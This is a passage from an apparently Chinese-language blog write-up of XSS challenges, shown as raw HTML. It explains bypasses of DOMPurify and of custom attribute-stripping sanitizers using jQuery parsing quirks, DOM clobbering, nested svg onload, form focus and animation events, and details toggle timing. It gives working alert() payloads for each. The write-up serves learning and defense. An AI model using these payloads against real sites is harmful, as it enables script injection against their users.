&#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            template = memeTemplate(img, text)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            if (notify) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                html = (`<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;alert alert-warning&quot;</span> <span class=\"attr\">role</span>=<span class=\"string\">&quot;alert&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>Meme<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span> created from $&#123;DOMPurify.sanitize(text)&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            setTimeout(_ =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                $(&#x27;#status&#x27;).remove()</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                $(&#x27;#meme-code&#x27;).text(template)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            &#125;, 1000)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"comment\">/* Main */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> notify = <span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> text = <span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> img = <span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;img&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">if</span> (text &amp;&amp; img) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`&lt;div class=&quot;alert alert-primary&quot; role=&quot;alert&quot; id=&quot;status&quot;&gt;`</span>+</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`&lt;img class=&quot;circle&quot; src=&quot;<span class=\"subst\">$&#123;<span class=\"built_in\">escape</span>(img)&#125;</span>&quot; onload=&quot;memeGen(this, notify)&quot;&gt;`</span>+</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`Creating meme... (<span class=\"subst\">$&#123;DOMPurify.sanitize(text)&#125;</span>)&lt;/div&gt;`</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        )</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        $(<span class=\"string\">&#x27;#meme-code&#x27;</span>).<span class=\"title function_\">text</span>(<span class=\"title function_\">memeTemplate</span>(<span class=\"string\">&#x27;https://i.imgur.com/PdbDexI.jpg&#x27;</span>, <span class=\"string\">&#x27;When you get that WW3 draft letter&#x27;</span>))</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">//代码分析，Utils中为函数声明，main中调用了Utils中的函数</span><br><span class=\"line\">//img和text都被escape或者DOMPurify过滤，无法利用这两个参数</span><br><span class=\"line\">//只要text和img为真，会调用memeGen,memeGen会调用memeTemplate，memeTemplate将img和text写入Meme code中</span><br><span class=\"line\">//memeGen只有SetTimeout中notify存在利用点</span><br><span class=\"line\">//当img和text都为真时，会调用memeTemplate，在meme-code中写入该内容</span><br><span class=\"line\">//memeTemplate存在可控变量img和text，但img在src中，并且存在escape函数，无法闭合，只能利用text</span><br><span class=\"line\">//text需要传入两个值：第一个是为了执行jQuery解析而覆盖的notify，第二个是利用了第一个解析产生弹窗的代码</span><br><span class=\"line\">//通过<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">name</span>=<span class=\"string\">notify</span>&gt;</span>覆盖notify,通过<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>配合jQuery解析绕过domporify</span><br><span class=\"line\">//进入dompuriy过滤的是<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>,此代码被认为合法，但过滤之后又会被jQuery解析，变为：</span><br><span class=\"line\">//<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//  ,style被闭合，script标签逃逸,完成弹窗   </span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">//第一个img必须是合法的图片才能保证img和text同时为真</span><br></pre></td></tr></table></figure>\n<p>前置知识 1 jquery script 标签逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">    $(&#x27;#status&#x27;).remove()</span><br><span class=\"line\">    notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span><br><span class=\"line\">    $(&#x27;#meme-code&#x27;).text(template)</span><br><span class=\"line\">&#125;, 1000)</span><br></pre></td></tr></table></figure>\n<p>两种解析 html 的方式:<strong>jquery.html&amp;innerhtml</strong>。 <code>innerHTML</code>  是原生 js 的写法， <code>Jqury.html()</code>  也是调用原生的 innerHTML 方法，但是加了自己的解析规则</p>\n<p>对于 innerHTML：模拟浏览器自动补全标签，不处理非法标签。同时， <code>&lt;style&gt;</code>  标签中不允许存在子标签 (style 标签最初的设计理念就不能用来放子标签)，如果存在会被当作 text 解析。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">    &lt;style/&gt;&lt;script&gt;alert(1337)//</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p>对于 <code>Jqury.html()</code> ，最终对标签的处理是在 <code>htmlPrefilter()</code>  中实现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rxhtmlTag = /&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^/&gt;x20trnf]*)[^&gt;]*)/&gt;/gi</span><br><span class=\"line\">jQuery.extend( &#123;</span><br><span class=\"line\">    htmlPrefilter: function( html ) &#123;</span><br><span class=\"line\">        return html.replace( rxhtmlTag, &quot;&lt;$1&gt;&lt;/$2&gt;&quot; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];</span><br><span class=\"line\"></span><br><span class=\"line\">此处正则匹配完的结果$1和$2均为style</span><br></pre></td></tr></table></figure>\n<p>这个正则表达式在匹配 <code>&lt;*/&gt;</code>  之后会重新生成一对标签 (区别于直接调用 innerHTML)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">    &lt;style&gt;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;script&gt;alert(1337)//</span><br></pre></td></tr></table></figure>\n<p>前置知识 2</p>\n<p>首先尝试用 DOM-clobbering 创造一个 id 为 <code>notify</code>  的变量，尝试覆盖 notify 使其变为真，走到为真的条件中，但是这种方式不允许覆盖已经存在的变量。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;img id=notify&gt;</span><br><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;memeGen(notify)&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">const memeGen = (notify) =&gt;&#123;</span><br><span class=\"line\">    consol.log(notify);  //false</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let notify = false;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>但我们可以通过 name 的局部作用域覆盖 notify</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img name=notify&gt;</span><br><span class=\"line\">此时notify为真</span><br></pre></td></tr></table></figure>\n<p>前置知识 3：</p>\n<p>JS 局部作用域和全局作用域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;console.log(nickname)&quot;&gt; //pig</span><br><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;var nickname=&#x27;dog&#x27;;console.log(nickname)&quot;&gt; //dog</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">window.document.nickname = &#x27;pig&#x27;;</span><br><span class=\"line\">window.nickname = &#x27;cat&#x27;;</span><br><span class=\"line\">&lt;script&gt;</span><br></pre></td></tr></table></figure>\n<p>在 document.write 中 notify 为 false，但通过 img 的局部作用域覆盖了 notify</p>\n<p>在 memeTemplate 中有如下语句：</p>\n<p><code>&lt;div class=&quot;meme-card&quot;&gt;&lt;img src=&quot;$&#123;img&#125;&quot;&gt;&lt;h1&gt;$&#123;text&#125;&lt;/h1&gt;&lt;/div&gt;</code> )</p>\n<p>我们可以将局部作用域的 img 放入 text 中同时利用 jQuery 的解析绕过 dompurify 的过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?img=https://i.imgur.com/PdbDexI.jpg&amp;text=&lt;img%20name=notify&gt;&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert()//</span><br></pre></td></tr></table></figure>\n<p>执行之后写入 memecode，div 中 script 标签被解析，完成弹窗</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012162102961.png\" alt=\"image-20221012162102961\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;notify&quot;&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;</span><br><span class=\"line\">\t\t&lt;b&gt;Meme&lt;/b&gt; </span><br><span class=\"line\">\t\tcreated from </span><br><span class=\"line\">\t\t&lt;img name=&quot;notify&quot;&gt;</span><br><span class=\"line\">\t\t&lt;style&gt;&lt;style&gt;&lt;/style&gt;</span><br><span class=\"line\">\t\t&lt;script&gt;alert()//&lt;/style&gt;&lt;/div&gt;&lt;/script&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"svg深入研究\"><a class=\"markdownIt-Anchor\" href=\"#svg深入研究\">#</a> &lt;svg&gt; 深入研究</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">data</span> = <span class=\"title function_ invoke__\">decodeURIComponent</span>(location.hash.<span class=\"title function_ invoke__\">substr</span>(<span class=\"number\">1</span>));</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">root</span> = document.<span class=\"title function_ invoke__\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">         el.<span class=\"title function_ invoke__\">removeAttribute</span>(name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">document.body.<span class=\"title function_ invoke__\">appendChild</span>(root)</span><br></pre></td></tr></table></figure>\n<p>HTML5 中 innerHtml 不执行插入的<script>标签</p>\n<p><strong>移除元素后，元素向前补，但指针向后移，导致没有完全移除所有元素</strong></p>\n<p>exp:  <code>&lt;img a src='a' b onerror=alert(1)&gt;</code></p>\n<p>因此我们一般不在同一个数组边循环边删除</p>\n<p>修复：先追加到数组中，在移除，即不要在源数组上操作</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     let attrs = []</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">         attrs.<span class=\"title function_ invoke__\">push</span>(attr.name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let name of attrs) &#123;</span><br><span class=\"line\">         el.<span class=\"title function_ invoke__\">removeAttribute</span>(name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">document.body.<span class=\"title function_ invoke__\">appendChild</span>(root); </span><br></pre></td></tr></table></figure>\n<p>使用以上修复后</p>\n<p>1. 别进循环</p>\n<p>2. 进循环别删有用数据</p>\n<p>method 1.(利用 html 页面渲染的竞争时间)</p>\n<p><code>&lt;svg&gt;&lt;svg onload=alert(1)&gt;</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM2MDcyNzk4NTEtY2UyNDFlNTItZDM4ZS00NWRjLTllZGMtODkxMTM2YTQ5OGI4Lm1k\">📎svg 的深度利用来绕过 waf.md</span></p>\n<p>1.1  <code>&lt;img src='1' onerror=&quot;alert(1)&quot;&gt;</code>  失败原因</p>\n<p>那么很明显， <code>alert(1)</code>  是在页面上 script 标签中的代码全部执行完毕以后才被调用的。这里涉及到浏览器渲染的另外一部分内容： <strong>在 DOM 树构建完成以后，就会触发</strong> <code>DOMContentLoaded</code>  事件，接着加载脚本、图片等外部文件，全部加载完成之后触发 <code>load</code> <strong> 事件</strong>。</p>\n<p>页面的 JS 执行是会阻塞 DOM 树构建的。<strong>所以总的来说，在 script 标签内的 JS 执行完毕以后，DOM 树才会构建完成，接着才会加载图片，然后发现加载内容出错才会触发</strong> <code>error</code> <strong> 事件</strong>。</p>\n<p>由于 js 阻塞 dom 树，一直到 js 语句执行结束后，才可以引入 img，此时 img 的属性已经被 sanitizer 清除了，自然也不可能执行事件代码了。</p>\n<p>1.2<svg><svg onload=alert(1)> 可以弹窗原因</p>\n<p>两个 svg 时，直接弹出了窗口，点击确定以后，调试器才会走到下一行代码，没有执行移除属性的代码。而且，这个地方如果只有一个 <code>&lt;svg onload=alert(1)&gt;</code> ，那么结果将同 img 一样，直到 script 标签结束以后才能执行相关的代码，这样的代码放到挑战里也将失败</p>\n<p>当我们没有正确闭合标签的时候，如 <code>&lt;svg&gt;&lt;svg&gt;</code> ，就可能调用到 <code>PopAll</code>  来清理；而正确闭合的标签就可能调用到其他出栈函数并调用到 <code>PopCommon</code> 。这两个函数有一个共同点，都会调用栈中元素的 <code>FinishParsingChildren</code>  函数。这个函数用于处理子节点解析完毕以后的工作。</p>\n<p><code>FinishParsingChildren</code>  有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>\n<p>最外层 svg 的 <code>load</code>  事件由 <code>LocalDOMWindow::dispatchWindowLoadEvent</code>  触发；而其他 svg 的 <code>load</code>  事件则在达到结束标记的时候触发。</p>\n<p>先决条件 在于 svg 不能最外层， onload 必须保证不是最外层属性，不是最外层 onload 会在 innerHTML 之前执行</p>\n<p>当没有过滤代码时：&lt;svg onload=console.log (“svg0”)&gt;&lt;svg onload=console.log (“svg1”)&gt;&lt;svg onload=console.log (“svg2”)&gt;</p>\n<p>触发顺序为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg2</span><br><span class=\"line\">svg1</span><br><span class=\"line\">DOMContentLoaded</span><br><span class=\"line\">svg0</span><br><span class=\"line\">load</span><br></pre></td></tr></table></figure>\n<p>套嵌的 svg 之所以成功，是因为当页面为 <code>root.innerHtml</code>  赋值的时候浏览器进入 DOM 树构建过程；在这个过程中<strong>会触发非最外层 svg 标签的 <code>load</code>  事件，最终成功执行代码</strong>。所以，sanitizer 执行的时间点在这之后，无法影响我们的 payload。</p>\n<p>1.3<svg onload=alert(1)> 失败原因</p>\n<p>这里有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>\n<p><code>&lt;svg onload=console.log(&quot;svg0&quot;)&gt;&lt;svg onload=console.log(&quot;svg1&quot;)&gt;&lt;svg onload=console.log(&quot;svg2&quot;)&gt;</code></p>\n<p>最内层的 svg 先触发，然后再到下一层，而且是在 DOM 树构建完成以前就触发了相关事件；最外层的 svg 则得等到 DOM 树构建完成才能触发。</p>\n<p>method 2. 使用 input 破坏 DOM</p>\n<p><code>&lt;style&gt;@keyframes x&#123;&#125;&lt;/style&gt;</code>   <code>&lt;form style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;</code>   <code>&lt;input id=&quot;attributes&quot;&gt;&lt;input id=&quot;attributes&quot;&gt;</code></p>\n<p>此时 for 循环中 el.attributes 抓到的是 form 的子标签，form 没有执行循环</p>\n<p>或者</p>\n<p><code>&lt;form tabindex=1 onfocus=&quot;alert(1);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;img id=attributes&gt;&lt;img id=attributes&gt;&lt;/form&gt;</code></p>\n<p><code>&lt;form tabindex=1 onfocus=&quot;alert(1);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;input id=attributes&gt;&lt;input id=attributes&gt;&lt;/form&gt;</code></p>\n<p>tabindex 的作用：</p>\n<p>设置 tab 选中的标签，tabindex=1 或 - 1，代表开始就选中，如果只有一个，只要有 tabindex 默认就选中</p>\n<p>需要两个 input 因为有两个 input 时组成了一个 htmlcollection，是可迭代对象。删除 name 的属性后 input 标签仍然可以 onfocus 实现弹窗</p>\n<p>onfoucs 是 input 属性，form 中必须有 input 才能聚焦</p>\n<p>method 3. 利用 details 弹窗</p>\n<p><code>ParseAttribute</code>  正是在解析文档处理标签属性的时候被调用的。注释也写到了，分发 toggle 事件的操作是异步的。</p>\n<p><strong>details 标签的 toggle 事件是异步触发的，并且直接对 details 标签的移除不会清除原先通过属性设置的异步任务</strong></p>\n<p>将 details 改为同步执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">data</span> = <span class=\"title function_ invoke__\">decodeURIComponent</span>(location.hash.<span class=\"title function_ invoke__\">substr</span>(<span class=\"number\">1</span>));;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">root</span> = document.<span class=\"title function_ invoke__\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">setTimeout</span>( () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     let attrs = [];</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">      attrs.<span class=\"title function_ invoke__\">push</span>(attr.name);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let name of attrs) &#123;</span><br><span class=\"line\">      el.<span class=\"title function_ invoke__\">removeAttribute</span>(name);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">    document.body.<span class=\"title function_ invoke__\">appendChild</span>(root)</span><br><span class=\"line\">&#125; , <span class=\"number\">2000</span>)</span><br></pre></td></tr></table></figure>\n<p>这样保证了 alert 一定会在 js 删除之前执行，执行点在 innerHTML</p>\n<p>如果没有弹出，可能在 js 删除之后才执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const data = decodeURIComponent(location.hash.substr(1));;</span><br><span class=\"line\">const root = document.createElement(&#x27;div&#x27;);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"></span><br><span class=\"line\">let details = root.querySelector(&quot;details&quot;)</span><br><span class=\"line\">root.removeChild(details)</span><br><span class=\"line\"></span><br><span class=\"line\">for (let el of root.querySelectorAll(&#x27;*&#x27;)) &#123;</span><br><span class=\"line\"> let attrs = [];</span><br><span class=\"line\"> for (let attr of el.attributes) &#123;</span><br><span class=\"line\">  attrs.push(attr.name);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> for (let name of attrs) &#123;</span><br><span class=\"line\">  el.removeAttribute(name);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>details 异步执行是将执行函数放入一个事件队列中，只要事件不停止，在放入事件队列中，删除 details 已经没用，事件队列仍会执行</p>\n<p>details 有延迟的话肯定执行成功，因为此时异步事件已经执行完成，执行点在 innerhtml 如果没有延迟，有可能在 js 删除属性之后，异步事件才执行完成</p>\n<h2 id=\"dom-clobbering-burp-suite\"><a class=\"markdownIt-Anchor\" href=\"#dom-clobbering-burp-suite\">#</a> Dom Clobbering - Burp Suite</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MDkwNjM2NzktYzAxY2IzM2EtYWQ2MS00ZTg0LTg2MTgtZGU1M2E4MjI4YjU4Lm1k\">📎Exploiting DOM clobbering to enable XSS.md</span></p>\n<h3 id=\"lab-exploiting-dom-clobbering-to-enable-xss\"><a class=\"markdownIt-Anchor\" href=\"#lab-exploiting-dom-clobbering-to-enable-xss\">#</a> Lab: Exploiting DOM clobbering to enable XSS</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function displayComments(comments) &#123;</span><br><span class=\"line\">    let userComments = document.getElementById(&quot;user-comments&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    for (let i = 0; i &lt; comments.length; ++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        comment = comments[i];</span><br><span class=\"line\">        let commentSection = document.createElement(&quot;section&quot;);</span><br><span class=\"line\">        commentSection.setAttribute(&quot;class&quot;, &quot;comment&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        let firstPElement = document.createElement(&quot;p&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        let defaultAvatar = window.defaultAvatar || &#123;avatar: &#x27;/resources/images/avatarDefault.svg&#x27;&#125;</span><br><span class=\"line\">        let avatarImgHTML = &#x27;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;avatar&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;&#x27; + (comment.avatar ? 